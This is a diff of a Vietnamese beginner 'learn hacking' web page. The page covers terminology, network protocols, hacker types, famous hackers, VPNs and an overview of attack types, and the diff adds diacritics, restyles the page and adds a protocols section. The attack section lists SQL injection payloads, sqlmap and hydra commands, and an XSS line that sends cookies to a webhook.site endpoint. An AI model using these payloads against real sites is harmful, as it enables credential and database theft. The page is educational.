@@ -3,527 +3,638 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Học Hacker - Giao Diện Đen Trắng Đơn Giản - Toàn Tập</title>
+    <title>Học Hacker Toàn Tập - Giao Diện Đen Trắng</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #000; color: #fff; font-family: 'Courier New', monospace;
-            padding: 20px; line-height: 1.6;
+            padding: 20px; line-height: 1.6; font-size: 18px;
         }
         .container {
-            max-width: 700px; margin: 0 auto;
+            max-width: 750px; margin: 0 auto;
         }
         h1 {
-            text-align: center; font-size: 22px; padding: 20px;
+            text-align: center; font-size: 26px; padding: 20px;
             border: 1px solid #fff; margin-bottom: 25px;
         }
         .accordion {
             border: 1px solid #fff; margin-bottom: 2px;
         }
         .accordion-header {
-            background: #000; color: #fff; padding: 14px 18px;
-            cursor: pointer; font-size: 15px; font-weight: bold;
+            background: #000; color: #fff; padding: 16px 20px;
+            cursor: pointer; font-size: 18px; font-weight: bold;
             border: none; width: 100%; text-align: left;
             font-family: 'Courier New', monospace;
             display: flex; justify-content: space-between; align-items: center;
         }
         .accordion-header:hover { background: #111; }
         .accordion-header::after {
-            content: '[+]'; font-size: 18px;
+            content: '[+]'; font-size: 20px;
         }
         .accordion-header.active::after {
             content: '[-]';
         }
         .accordion-content {
             display: none; padding: 20px; border-top: 1px solid #fff;
-            font-size: 14px; background: #0a0a0a;
+            font-size: 16px; background: #0a0a0a;
         }
         .accordion-content.show { display: block; }
         pre {
             background: #000; padding: 15px; margin: 10px 0;
             border: 1px solid #333; overflow-x: auto;
-            font-family: 'Courier New', monospace; font-size: 13px;
+            font-family: 'Courier New', monospace; font-size: 15px;
             white-space: pre-wrap; word-break: break-all;
         }
         code {
             background: #111; padding: 2px 6px;
-            font-family: 'Courier New', monospace;
+            font-family: 'Courier New', monospace; font-size: 15px;
         }
         table {
-            width: 100%; border-collapse: collapse; margin: 12px 0;
+            width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 16px;
         }
         th, td {
-            border: 1px solid #fff; padding: 8px; text-align: left;
+            border: 1px solid #fff; padding: 10px; text-align: left;
         }
         th { background: #111; }
-        .step {
-            border: 1px solid #333; padding: 12px; margin: 8px 0;
-        }
-        .step-num {
-            display: inline-block; border: 1px solid #fff;
-            width: 26px; height: 26px; text-align: center; line-height: 26px;
-            margin-right: 8px;
-        }
+        h3 { margin: 15px 0 8px; font-size: 20px; }
         .warning {
-            border: 1px solid #fff; padding: 12px; margin: 10px 0;
-            background: #111;
+            border: 1px solid #fff; padding: 15px; margin: 15px 0;
+            background: #111; font-size: 16px;
         }
     </style>
 </head>
 <body>
     <div class="container">
 
-        <h1>HOC HACKER TOAN TAP - TU A DEN Z</h1>
+        <h1>HỌC HACKER TOÀN TẬP - TỪ A ĐẾN Z</h1>
 
-        <!-- 1 -->
+        <!-- 1. Khái niệm cơ bản -->
         <div class="accordion">
-            <button class="accordion-header">KHAI NIEM CO BAN - THUAT NGU</button>
+            <button class="accordion-header">KHÁI NIỆM CƠ BẢN - THUẬT NGỮ</button>
             <div class="accordion-content">
                 <table>
-                    <tr><th>Thuat ngu</th><th>Nghia don gian</th></tr>
-                    <tr><td>Bug</td><td>Loi trong chuong trinh</td></tr>
-                    <tr><td>Exploit</td><td>Cach loi dung loi</td></tr>
-                    <tr><td>Virus</td><td>Phan mem doc hai, tu nhan ban</td></tr>
-                    <tr><td>Malware</td><td>Phan mem xau noi chung</td></tr>
-                    <tr><td>Phishing</td><td>Lua dao gia mao</td></tr>
-                    <tr><td>DDoS</td><td>Tan cong lam nghen website</td></tr>
-                    <tr><td>VPN</td><td>Mang rieng ao, che IP</td></tr>
-                    <tr><td>Proxy</td><td>May trung gian, an IP</td></tr>
-                    <tr><td>IP</td><td>Dia chi tren internet</td></tr>
-                    <tr><td>Port</td><td>Cua vao may tinh</td></tr>
-                    <tr><td>Firewall</td><td>Tuong lua, chan nguoi la</td></tr>
-                    <tr><td>SQL Injection</td><td>Chen lenh SQL vao web</td></tr>
-                    <tr><td>XSS</td><td>Chen JavaScript vao web</td></tr>
-                    <tr><td>Brute Force</td><td>Thu tat ca mat khau</td></tr>
-                    <tr><td>Backdoor</td><td>Cua sau bi mat vao may</td></tr>
-                    <tr><td>Botnet</td><td>Mang luoi may tinh ma</td></tr>
-                    <tr><td>Root</td><td>Quyen cao nhat</td></tr>
-                    <tr><td>Jailbreak</td><td>Pha khoa iPhone</td></tr>
-                    <tr><td>Ransomware</td><td>Ma hoa doi tien chuoc</td></tr>
-                    <tr><td>Keylogger</td><td>Ghi lai moi phim bam</td></tr>
-                    <tr><td>Zero-Day</td><td>Lo hong chua duoc va</td></tr>
-                    <tr><td>Payload</td><td>Ma doc thuc thi</td></tr>
-                    <tr><td>Shell</td><td>Giao dien dong lenh</td></tr>
-                    <tr><td>Sandbox</td><td>Moi truong cach ly</td></tr>
-                    <tr><td>Encryption</td><td>Ma hoa du lieu</td></tr>
+                    <tr><th>Thuật ngữ</th><th>Nghĩa đơn giản</th></tr>
+                    <tr><td>Bug</td><td>Lỗi trong chương trình</td></tr>
+                    <tr><td>Exploit</td><td>Cách lợi dụng lỗi</td></tr>
+                    <tr><td>Virus</td><td>Phần mềm độc hại, tự nhân bản</td></tr>
+                    <tr><td>Malware</td><td>Phần mềm xấu nói chung</td></tr>
+                    <tr><td>Phishing</td><td>Lừa đảo giả mạo</td></tr>
+                    <tr><td>DDoS</td><td>Tấn công làm nghẽn website</td></tr>
+                    <tr><td>VPN</td><td>Mạng riêng ảo, che IP</td></tr>
+                    <tr><td>Proxy</td><td>Máy trung gian, ẩn IP</td></tr>
+                    <tr><td>IP</td><td>Địa chỉ trên internet</td></tr>
+                    <tr><td>Port</td><td>Cửa vào máy tính</td></tr>
+                    <tr><td>Firewall</td><td>Tường lửa, chặn người lạ</td></tr>
+                    <tr><td>SQL Injection</td><td>Chèn lệnh SQL vào web</td></tr>
+                    <tr><td>XSS</td><td>Chèn JavaScript vào web</td></tr>
+                    <tr><td>Brute Force</td><td>Thử tất cả mật khẩu</td></tr>
+                    <tr><td>Backdoor</td><td>Cửa sau bí mật vào máy</td></tr>
+                    <tr><td>Botnet</td><td>Mạng lưới máy tính ma</td></tr>
+                    <tr><td>Root</td><td>Quyền cao nhất</td></tr>
+                    <tr><td>Jailbreak</td><td>Phá khóa iPhone</td></tr>
+                    <tr><td>Ransomware</td><td>Mã hóa đòi tiền chuộc</td></tr>
+                    <tr><td>Keylogger</td><td>Ghi lại mọi phím bấm</td></tr>
+                    <tr><td>Zero-Day</td><td>Lỗ hổng chưa được vá</td></tr>
+                    <tr><td>Payload</td><td>Mã độc thực thi</td></tr>
+                    <tr><td>Shell</td><td>Giao diện dòng lệnh</td></tr>
+                    <tr><td>Sandbox</td><td>Môi trường cách ly</td></tr>
+                    <tr><td>Encryption</td><td>Mã hóa dữ liệu</td></tr>
                 </table>
             </div>
         </div>
 
-        <!-- 2 -->
+        <!-- 2. TCP/UDP, DNS, HTTP/HTTPS -->
         <div class="accordion">
-            <button class="accordion-header">CAC LOAI HACKER (MU) - CHI TIET TUNG LOAI</button>
+            <button class="accordion-header">TCP/UDP - DNS - HTTP/HTTPS (GIAO THỨC MẠNG)</button>
             <div class="accordion-content">
-                <h3>BLACK HAT (Mu Den)</h3>
-                <pre>Nguoi xau, hack vi tien, pha hoai.
-Cach hoat dong:
-1. Trinh sat (Recon): Thu thap thong tin muc tieu
-2. Quet (Scan): Nmap, Nessus tim lo hong
-3. Khai thac (Exploit): Dung Metasploit, SQLMap
-4. Hau khai thac: Cai backdoor, danh cap du lieu
-5. Xoa log, an dau vet, ban du lieu tren dark web
+                <h3>TCP (Transmission Control Protocol)</h3>
+                <pre>Là giao thức truyền dữ liệu TIN CẬY, đảm bảo dữ liệu đến đúng và đủ.
 
-Cong cu: Metasploit, Cobalt Strike, Mimikatz, Empire, Burp Suite</pre>
-                <h3>WHITE HAT (Mu Trang)</h3>
-                <pre>Nguoi tot, bao ve he thong.
-Cach hoat dong:
-1. Lap ke hoach: Ky hop dong, xac dinh pham vi
-2. Trinh sat: Thu thap thong tin CO PHEP
-3. Quet va liet ke: Tim lo hong, ghi chep
-4. Khai thac co kiem soat: Chi lay PoC, khong gay hai
-5. Bao cao: Viet report, danh gia CVSS, de xuat sua loi
+CÁCH HOẠT ĐỘNG:
+Giống như gửi thư bảo đảm qua bưu điện. Người nhận phải ký xác nhận đã nhận.
 
-Chung chi: CEH, OSCP, CISSP, GPEN</pre>
-                <h3>GREY HAT (Mu Xam)</h3>
-                <pre>O giua, xam nhap khong xin phep nhung khong gay hai.
-Thuong tim lo hong tinh co -> bao cho chu he thong.
-Co the yeu cau tien thuong. Neu bi tu choi, cong khai sau 90 ngay.
-Rui ro phap ly cao vi xam nhap trai phep.</pre>
-                <h3>BLUE HAT (Mu Xanh Duong)</h3>
-                <pre>Chuyen gia bao mat duoc Microsoft thue.
-Tim lo hong trong san pham Microsoft.
-Tham gia BlueHat Conference.
-Nhan thuong len den $250,000.</pre>
-                <h3>RED HAT (Mu Do)</h3>
-                <pre>San lung Black Hat. Tan cong nguoc lai hacker xau.
-Tu y vo hieu hoa hacker xau. Ranh gioi phap ly rat mong manh.</pre>
-                <h3>GREEN HAT (Mu Xanh La)</h3>
-                <pre>Nguoi moi hoc, chua co ky nang cao.
-Dung cong cu co san (script kiddie).
-Lo trinh: Networking -> Linux -> Python -> OWASP -> CTF -> Thuc tap.</pre>
-                <h3>PURPLE HAT (Mu Tim)</h3>
-                <pre>Ket hop Red Team (tan cong) va Blue Team (phong thu).
-Tu tan cong he thong cua minh de cai thien.</pre>
+QUY TRÌNH "BẮT TAY 3 BƯỚC" (Three-Way Handshake):
+1. Client gửi: SYN (Tôi muốn kết nối)
+2. Server trả lời: SYN-ACK (Tôi sẵn sàng, bạn sẵn sàng chưa?)
+3. Client gửi: ACK (Tôi sẵn sàng, bắt đầu truyền dữ liệu)
+
+VÍ DỤ THỰC TẾ:
+- Tải file: File phải tải đầy đủ, không được thiếu
+- Gửi email: Email phải đến đúng người nhận
+- Xem web HTTP/HTTPS: Trang web phải hiển thị đầy đủ
+
+ĐẶC ĐIỂM:
+- Chậm hơn UDP (vì phải kiểm tra)
+- Đảm bảo dữ liệu đến đúng thứ tự
+- Tự động gửi lại nếu mất gói tin
+- Dùng cho web (HTTP), email (SMTP), file (FTP)</pre>
+                <h3>UDP (User Datagram Protocol)</h3>
+                <pre>Là giao thức truyền dữ liệu KHÔNG TIN CẬY, nhanh nhưng không đảm bảo.
+
+CÁCH HOẠT ĐỘNG:
+Giống như ném máy bay giấy qua cửa sổ. Có thể đến, có thể không, không cần xác nhận.
+
+KHÔNG CÓ "BẮT TAY":
+Client cứ gửi dữ liệu đi, không cần server xác nhận.
+
+VÍ DỤ THỰC TẾ:
+- Xem video trực tuyến (YouTube, TikTok): Mất vài khung hình cũng không sao
+- Gọi điện thoại qua mạng (VoIP, Zalo, Messenger): Ưu tiên thời gian thực
+- Chơi game online: Cần tốc độ nhanh, mất vài gói tin không quan trọng
+- DNS query: Tra cứu tên miền
+
+ĐẶC ĐIỂM:
+- Nhanh hơn TCP (không kiểm tra)
+- Không đảm bảo dữ liệu đến đúng thứ tự
+- Không gửi lại nếu mất gói tin
+- Dùng cho video call, game, livestream, DNS</pre>
+                <h3>SO SÁNH TCP vs UDP</h3>
+                <table>
+                    <tr><th>Tiêu chí</th><th>TCP</th><th>UDP</th></tr>
+                    <tr><td>Độ tin cậy</td><td>Cao (đảm bảo)</td><td>Thấp (không đảm bảo)</td></tr>
+                    <tr><td>Tốc độ</td><td>Chậm hơn</td><td>Nhanh hơn</td></tr>
+                    <tr><td>Kết nối</td><td>Cần bắt tay 3 bước</td><td>Không cần kết nối</td></tr>
+                    <tr><td>Thứ tự dữ liệu</td><td>Đúng thứ tự</td><td>Có thể sai thứ tự</td></tr>
+                    <tr><td>Gửi lại gói mất</td><td>Có</td><td>Không</td></tr>
+                    <tr><td>Dùng cho</td><td>Web, Email, File</td><td>Video call, Game, DNS</td></tr>
+                </table>
+                <h3>DNS (Domain Name System)</h3>
+                <pre>LÀ GÌ?
+DNS là "danh bạ điện thoại" của internet. Đổi tên miền (google.com) thành địa chỉ IP (142.250.186.46).
+
+CÁCH HOẠT ĐỘNG:
+1. Bạn gõ: google.com
+2. Máy hỏi DNS server: "google.com ở đâu?"
+3. DNS trả lời: "Địa chỉ IP là 142.250.186.46"
+4. Máy kết nối đến IP đó
+
+CÁC LOẠI BẢN GHI DNS:
+A Record: Tên miền -> IPv4 (google.com -> 142.250.186.46)
+AAAA Record: Tên miền -> IPv6
+CNAME Record: Bí danh (www.google.com -> google.com)
+MX Record: Mail server (dùng cho email)
+NS Record: DNS server quản lý tên miền đó
+TXT Record: Văn bản tùy chọn (dùng xác minh domain)
+
+DNS HOẠT ĐỘNG QUA UDP PORT 53.
+Khi dữ liệu DNS quá lớn (>512 bytes) thì dùng TCP.
+
+TẤN CÔNG DNS PHỔ BIẾN:
+1. DNS Spoofing/Poisoning: Đầu độc DNS, chuyển hướng google.com -> trang giả
+2. DNS Hijacking: Chiếm quyền DNS, đổi toàn bộ bản ghi
+3. DNS Tunneling: Dùng DNS để truyền dữ liệu lén (vượt firewall)
+4. DNS Amplification DDoS: Lợi dụng DNS để khuếch đại tấn công DDoS</pre>
+                <h3>HTTP (HyperText Transfer Protocol)</h3>
+                <pre>LÀ GÌ?
+Giao thức truyền tải trang web. Là cách browser nói chuyện với server.
+
+HOẠT ĐỘNG QUA TCP PORT 80.
+
+REQUEST (Browser -> Server):
+GET /trang-chu HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0
+Accept: text/html
+
+RESPONSE (Server -> Browser):
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1234
+
+<html>...nội dung trang web...</html>
+
+PHƯƠNG THỨC HTTP:
+GET: Lấy dữ liệu (xem trang web)
+POST: Gửi dữ liệu (đăng nhập, form)
+PUT: Cập nhật toàn bộ
+PATCH: Cập nhật một phần
+DELETE: Xóa
+
+HTTP KHÔNG MÃ HÓA -> Dữ liệu gửi dưới dạng văn bản thô -> Ai bắt được đều đọc được!</pre>
+                <h3>HTTPS (HTTP Secure)</h3>
+                <pre>LÀ GÌ?
+HTTP có mã hóa SSL/TLS. Dữ liệu bị mã hóa, không ai đọc được.
+
+HOẠT ĐỘNG QUA TCP PORT 443.
+
+CÁCH HOẠT ĐỘNG (TÓM TẮT):
+1. Browser yêu cầu kết nối an toàn
+2. Server gửi chứng chỉ SSL (khóa công khai)
+3. Browser kiểm tra chứng chỉ (có hợp lệ không?)
+4. Browser tạo khóa bí mật, mã hóa bằng khóa công khai của server
+5. Server giải mã bằng khóa riêng -> Cả hai có chung khóa bí mật
+6. Mọi dữ liệu sau đó đều được mã hóa bằng khóa bí mật này
+
+LỢI ÍCH HTTPS:
+- Mã hóa: Không ai đọc được dữ liệu
+- Xác thực: Đảm bảo bạn đang nói chuyện với đúng server (không phải giả mạo)
+- Toàn vẹn: Dữ liệu không bị thay đổi trên đường truyền
+
+NHẬN BIẾT: Có biểu tượng ổ khóa xanh trên browser.
+
+TẤN CÔNG HTTPS:
+1. SSL Strip: Ép kết nối HTTPS -> HTTP (bỏ mã hóa)
+2. Man-in-the-Middle với chứng chỉ giả
+3. Khai thác lỗ hổng SSL/TLS cũ (Heartbleed, POODLE)</pre>
             </div>
         </div>
 
-        <!-- 3 -->
+        <!-- 3. Các loại Hacker -->
         <div class="accordion">
-            <button class="accordion-header">HACKER NOI TIENG & CACH HO HACK</button>
+            <button class="accordion-header">CÁC LOẠI HACKER (MŨ) - CHI TIẾT TỪNG LOẠI</button>
             <div class="accordion-content">
-                <h3>Hieu PC (Ngo Minh Hieu) - Viet Nam</h3>
-                <pre>Tuong la Black Hat chuyen danh cap du lieu, bi FBI bat, sau thanh White Hat tai NCSC Viet Nam.
-Ky thuat: SQL Injection, Phishing, Social Engineering.
-Danh cap du lieu hang loat, ban tren dark web.
-Bi bat tai Guam (My) 2013, 13 nam tu.
-Bai hoc: "Dung ky nang de bao ve, khong pha hoai."</pre>
-                <h3>Kevin Mitnick (My) - Black Hat -> White Hat</h3>
-                <pre>Hacker bi truy na gat gao nhat My thap nien 90.
-Ky thuat chinh: SOCIAL ENGINEERING.
-Gia lam nhan vien IT goi dien lua nhan vien.
-Danh cap ma nguon Motorola, Nokia, Sun.
-Tu che thiet bi gia mao tram phat song (cell tower).
-Bi bat 1995, 5 nam tu. Sau thanh chuyen gia bao mat hang dau.
-Viet sach: "Ghost in the Wires", "The Art of Deception".</pre>
-                <h3>Evgeniy Bogachev (Nga) - Black Hat</h3>
-                <pre>Tao ra GameOver ZeuS - botnet danh cap >100 trieu USD.
-Phat tan malware qua email phishing.
-Keylogger + man hinh ngan hang -> chuyen tien tu dong.
-FBI treo thuong $3,000,000. Van dang bi truy na.</pre>
-                <h3>Marcus Hutchins / MalwareTech (Anh) - Grey -> White</h3>
-                <pre>Vo tinh dung cuoc tan cong WannaCry toan cau 2017.
-Phat hien "kill switch" trong ma WannaCry.
-Mua domain iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com voi $10.69.
-Kich hoat DNS sinkhole -> WannaCry tu dung.</pre>
-                <h3>Edward Snowden (My) - Whistleblower</h3>
-                <pre>Cuu nhan vien NSA. Tiet lo chuong trinh giam sat PRISM.
-Dung quyen admin copy 200,000+ tai lieu mat.
-Giau the nho trong Rubik's Cube.
-Tiet lo NSA giam sat internet toan cau.
-Dang song ti nan tai Nga.</pre>
+                <h3>MŨ ĐEN (Black Hat)</h3>
+                <pre>Người xấu, hack vì tiền, phá hoại.
+Cách hoạt động:
+1. Trinh sát: Thu thập thông tin mục tiêu
+2. Quét: Nmap, Nessus tìm lỗ hổng
+3. Khai thác: Dùng Metasploit, SQLMap
+4. Hậu khai thác: Cài backdoor, đánh cắp dữ liệu
+5. Xóa log, ẩn dấu vết, bán dữ liệu trên dark web
+
+Công cụ: Metasploit, Cobalt Strike, Mimikatz, Empire, Burp Suite</pre>
+                <h3>MŨ TRẮNG (White Hat)</h3>
+                <pre>Người tốt, bảo vệ hệ thống.
+Cách hoạt động:
+1. Lập kế hoạch: Ký hợp đồng, xác định phạm vi
+2. Trinh sát: Thu thập thông tin CÓ PHÉP
+3. Quét và liệt kê: Tìm lỗ hổng, ghi chép
+4. Khai thác có kiểm soát: Chỉ lấy PoC, không gây hại
+5. Báo cáo: Viết report, đánh giá CVSS, đề xuất sửa lỗi
+
+Chứng chỉ: CEH, OSCP, CISSP, GPEN</pre>
+                <h3>MŨ XÁM (Grey Hat)</h3>
+                <pre>Ở giữa, xâm nhập không xin phép nhưng không gây hại.
+Thường tìm lỗ hổng tình cờ rồi báo cho chủ hệ thống.
+Có thể yêu cầu tiền thưởng. Nếu bị từ chối, công khai sau 90 ngày.
+Rủi ro pháp lý cao vì xâm nhập trái phép.</pre>
+                <h3>MŨ XANH DƯƠNG (Blue Hat)</h3>
+                <pre>Chuyên gia bảo mật được Microsoft thuê.
+Tìm lỗ hổng trong sản phẩm Microsoft.
+Nhận thưởng lên đến $250,000.</pre>
+                <h3>MŨ ĐỎ (Red Hat)</h3>
+                <pre>Săn lùng Mũ Đen. Tấn công ngược lại hacker xấu.
+Tự ý vô hiệu hóa hacker xấu. Ranh giới pháp lý rất mong manh.</pre>
+                <h3>MŨ XANH LÁ (Green Hat)</h3>
+                <pre>Người mới học, chưa có kỹ năng cao.
+Dùng công cụ có sẵn (script kiddie).
+Lộ trình: Networking -> Linux -> Python -> OWASP -> CTF -> Thực tập.</pre>
+                <h3>MŨ TÍM (Purple Hat)</h3>
+                <pre>Kết hợp Red Team (tấn công) và Blue Team (phòng thủ).
+Tự tấn công hệ thống của mình để cải thiện.</pre>
             </div>
         </div>
 
-        <!-- 4 -->
+        <!-- 4. Hacker nổi tiếng -->
         <div class="accordion">
-            <button class="accordion-header">CACH HOAT DONG CUA TRANG WEB</button>
+            <button class="accordion-header">HACKER NỔI TIẾNG VÀ CÁCH HỌ HACK</button>
             <div class="accordion-content">
-                <pre>MO HINH HOAT DONG:
-Ban (Browser)                Server (May chu)
-    |  1. Go URL: facebook.com     |
+                <h3>Hiếu PC (Ngô Minh Hiếu) - Việt Nam</h3>
+                <pre>Từng là Mũ Đen chuyên đánh cắp dữ liệu, bị FBI bắt, sau thành Mũ Trắng tại NCSC Việt Nam.
+Kỹ thuật: SQL Injection, Phishing, Social Engineering.
+Đánh cắp dữ liệu hàng loạt, bán trên dark web.
+Bị bắt tại Guam (Mỹ) 2013, 13 năm tù.
+Bài học: "Dùng kỹ năng để bảo vệ, không phá hoại."</pre>
+                <h3>Kevin Mitnick (Mỹ) - Mũ Đen thành Mũ Trắng</h3>
+                <pre>Hacker bị truy nã gắt gao nhất Mỹ thập niên 90.
+Kỹ thuật chính: SOCIAL ENGINEERING.
+Giả làm nhân viên IT gọi điện lừa nhân viên.
+Đánh cắp mã nguồn Motorola, Nokia, Sun.
+Tự chế thiết bị giả mạo trạm phát sóng.
+Bị bắt 1995, 5 năm tù. Sau thành chuyên gia bảo mật hàng đầu.
+Viết sách: "Ghost in the Wires", "The Art of Deception".</pre>
+                <h3>Evgeniy Bogachev (Nga) - Mũ Đen</h3>
+                <pre>Tạo ra GameOver ZeuS - botnet đánh cắp hơn 100 triệu USD.
+Phát tán malware qua email phishing.
+FBI treo thưởng $3,000,000. Vẫn đang bị truy nã.</pre>
+                <h3>Marcus Hutchins (Anh) - Mũ Xám thành Mũ Trắng</h3>
+                <pre>Vô tình dừng cuộc tấn công WannaCry toàn cầu 2017.
+Phát hiện "kill switch" trong mã WannaCry.
+Mua domain lạ với $10.69 -> WannaCry tự dừng.</pre>
+                <h3>Edward Snowden (Mỹ) - Whistleblower</h3>
+                <pre>Cựu nhân viên NSA. Tiết lộ chương trình giám sát PRISM.
+Dùng quyền admin copy hơn 200,000 tài liệu mật.
+Giấu thẻ nhớ trong Rubik's Cube.
+Hiện sống tị nạn tại Nga.</pre>
+            </div>
+        </div>
+
+        <!-- 5. Cách hoạt động của trang web -->
+        <div class="accordion">
+            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA TRANG WEB</button>
+            <div class="accordion-content">
+                <pre>MÔ HÌNH HOẠT ĐỘNG:
+Bạn (Browser)                Server (Máy chủ)
+    |  1. Gõ URL: facebook.com     |
     |----------------------------->|
     |  2. GET / HTTP/1.1           |
     |                              |
-    |  3. Server xu ly             |
+    |  3. Server xử lý             |
     |<-----------------------------|
     |  4. HTML + CSS + JavaScript  |
     |                              |
-    |  5. Hien thi trang web       |
+    |  5. Hiển thị trang web       |
 
-THANH PHAN:
-HTML = Khung xuong (noi dung, cau truc)
-CSS = Trang tri (mau sac, bo cuc)
-JavaScript = Tuong tac (nut bam, animation)
-Backend = Logic xu ly (PHP, Python, Node.js)
-Database = Luu tru du lieu (MySQL, MongoDB)
-
-HTTP METHODS:
-GET     -> Lay du lieu (xem trang web)
-POST    -> Gui du lieu (dang nhap, dang ky)
-PUT     -> Cap nhat du lieu
-DELETE  -> Xoa du lieu
-
-HTTP STATUS CODES:
-200 OK              -> Thanh cong
-301/302             -> Chuyen huong
-403 Forbidden       -> Bi cam truy cap
-404 Not Found       -> Khong tim thay
-500 Internal Error  -> Loi server</pre>
+THÀNH PHẦN:
+HTML = Khung xương (nội dung, cấu trúc)
+CSS = Trang trí (màu sắc, bố cục)
+JavaScript = Tương tác (nút bấm, animation)
+Backend = Logic xử lý (PHP, Python, Node.js)
+Database = Lưu trữ dữ liệu (MySQL, MongoDB)</pre>
             </div>
         </div>
 
-        <!-- 5 -->
+        <!-- 6. Proxy & VPN -->
         <div class="accordion">
-            <button class="accordion-header">PROXY & VPN - AN DANH TREN MANG</button>
+            <button class="accordion-header">PROXY VÀ VPN - ẨN DANH TRÊN MẠNG</button>
             <div class="accordion-content">
-                <h3>PROXY LA GI?</h3>
-                <pre>Ban nho thang ban chuyen thu giup -> Thang ban = Proxy!
-Ban ---> Proxy ---> Internet (an IP that)
-HTTP Proxy: Chi cho web
-SOCKS5 Proxy: Cho moi thu
-Elite Proxy: An hoan toan</pre>
-                <h3>VPN LA GI?</h3>
-                <pre>Mac dong phuc truong khac de vao thu vien -> Dong phuc = VPN!
-Ban ---> [Duong ham ma hoa] ---> Internet (khong ai doc duoc)
-Proxy: Khong ma hoa, nhanh, re
-VPN: Co ma hoa, cham hon, an toan hon</pre>
-                <h3>CACH CAI DAT TREN IPHONE:</h3>
-                <pre>VPN: Cai dat -> Chung -> VPN -> Them cau hinh VPN
-App VPN mien phi: ProtonVPN, Windscribe, TunnelBear
-Proxy: Cai dat -> Wi-Fi -> Chon mang -> HTTP Proxy -> Thu cong -> Nhap IP va Port</pre>
+                <h3>PROXY LÀ GÌ?</h3>
+                <pre>Bạn nhờ thằng bạn chuyển thư giúp -> Thằng bạn = Proxy!
+Bạn ---> Proxy ---> Internet (ẩn IP thật)
+HTTP Proxy: Chỉ cho web
+SOCKS5 Proxy: Cho mọi thứ
+Elite Proxy: Ẩn hoàn toàn</pre>
+                <h3>VPN LÀ GÌ?</h3>
+                <pre>Mặc đồng phục trường khác để vào thư viện -> Đồng phục = VPN!
+Bạn ---> [Đường hầm mã hóa] ---> Internet (không ai đọc được)
+Proxy: Không mã hóa, nhanh, rẻ
+VPN: Có mã hóa, chậm hơn, an toàn hơn</pre>
+                <h3>CÁCH CÀI ĐẶT TRÊN IPHONE:</h3>
+                <pre>VPN: Cài đặt -> Chung -> VPN -> Thêm cấu hình VPN
+App VPN miễn phí: ProtonVPN, Windscribe, TunnelBear
+Proxy: Cài đặt -> Wi-Fi -> Chọn mạng -> HTTP Proxy -> Thủ công -> Nhập IP và Port</pre>
             </div>
         </div>
 
-        <!-- 6 -->
+        <!-- 7. Tất cả các dạng tấn công -->
         <div class="accordion">
-            <button class="accordion-header">TAT CA CAC DANG TAN CONG HACKING</button>
+            <button class="accordion-header">TẤT CẢ CÁC DẠNG TẤN CÔNG HACKING</button>
             <div class="accordion-content">
-                <h3>1. DDoS - Danh sap website</h3>
-                <pre>1000 nguoi chen vao 1 cua hang nho -> Khong ai vao duoc.
-Guii hang trieu request/giiay -> Server qua tai -> sup.
-Cong cu: LOIC, HOIC, Slowloris, hping3</pre>
-                <h3>2. SQL Injection - Danh cap database</h3>
-                <pre>Nhap code SQL thay vi username.
+                <h3>1. DDoS - Đánh sập website</h3>
+                <pre>1000 người chen vào 1 cửa hàng nhỏ -> Không ai vào được.
+Gửi hàng triệu request/giây -> Server quá tải -> Sập.
+Công cụ: LOIC, HOIC, Slowloris, hping3</pre>
+                <h3>2. SQL Injection - Đánh cắp database</h3>
+                <pre>Nhập code SQL thay vì username.
 Payload: ' OR '1'='1' --
          ' UNION SELECT username,password FROM users --
-Cong cu: sqlmap -u "URL" --dbs</pre>
-                <h3>3. XSS - Chen JavaScript</h3>
-                <pre>Payload: <script>alert('XSS')</script>
-Danh cap cookie: <script>fetch('https://webhook.site/ID?c='+document.cookie)</script>
-Cac loai: Stored XSS, Reflected XSS, DOM-based XSS</pre>
-                <h3>4. Phishing - Lua dao gia mao</h3>
-                <pre>Tao trang web gia mao giong that. Gui link cho nan nhan.
-Ho dang nhap -> Ban co mat khau.
-Dau hieu: URL la, email sai chinh ta, yeu cau gap.</pre>
-                <h3>5. Brute Force - Do mat khau</h3>
-                <pre>Thu tat ca mat khau co the.
-Cong cu: Hydra, John the Ripper, Hashcat.
+Công cụ: sqlmap -u "URL" --dbs</pre>
+                <h3>3. XSS - Chèn JavaScript</h3>
+                <pre>Payload: script alert('XSS') /script
+Đánh cắp cookie: script fetch('https://webhook.site/ID?c='+document.cookie) /script
+Các loại: Stored XSS, Reflected XSS, DOM-based XSS</pre>
+                <h3>4. Phishing - Lừa đảo giả mạo</h3>
+                <pre>Tạo trang web giả mạo giống thật. Gửi link cho nạn nhân.
+Họ đăng nhập -> Bạn có mật khẩu.
+Dấu hiệu: URL lạ, email sai chính tả, yêu cầu gấp.</pre>
+                <h3>5. Brute Force - Dò mật khẩu</h3>
+                <pre>Thử tất cả mật khẩu có thể.
+Công cụ: Hydra, John the Ripper, Hashcat.
 hydra -l admin -P pass.txt target.com http-post-form</pre>
-                <h3>6. MITM - Tan cong trung gian</h3>
-                <pre>Dung giua nan nhan va internet, doc trom + thay doi du lieu.
-Cong cu: BetterCAP, Ettercap, arpspoof.</pre>
-                <h3>7. Ransomware - Ma hoa doi tien chuoc</h3>
-                <pre>Ma hoa toan bo file nan nhan. Doi tien chuoc bang Bitcoin.
-Vi du: WannaCry, LockBit, CryptoLocker.</pre>
-                <h3>8. Social Engineering - Lua dao tam ly</h3>
-                <pre>Lua con nguoi, khong phai he thong.
-Gia lam nhan vien IT goi dien, gia lam sep nhan tin.
-Con nguoi la mat xich yeu nhat.</pre>
+                <h3>6. MITM - Tấn công trung gian</h3>
+                <pre>Đứng giữa nạn nhân và internet, đọc trộm và thay đổi dữ liệu.
+Công cụ: BetterCAP, Ettercap, arpspoof.</pre>
+                <h3>7. Ransomware - Mã hóa đòi tiền chuộc</h3>
+                <pre>Mã hóa toàn bộ file nạn nhân. Đòi tiền chuộc bằng Bitcoin.
+Ví dụ: WannaCry, LockBit, CryptoLocker.</pre>
+                <h3>8. Social Engineering - Lừa đảo tâm lý</h3>
+                <pre>Lừa con người, không phải hệ thống.
+Giả làm nhân viên IT gọi điện, giả làm sếp nhắn tin.
+Con người là mắt xích yếu nhất.</pre>
             </div>
         </div>
 
-        <!-- 7 -->
+        <!-- 8. Cách report Facebook & TikTok -->
         <div class="accordion">
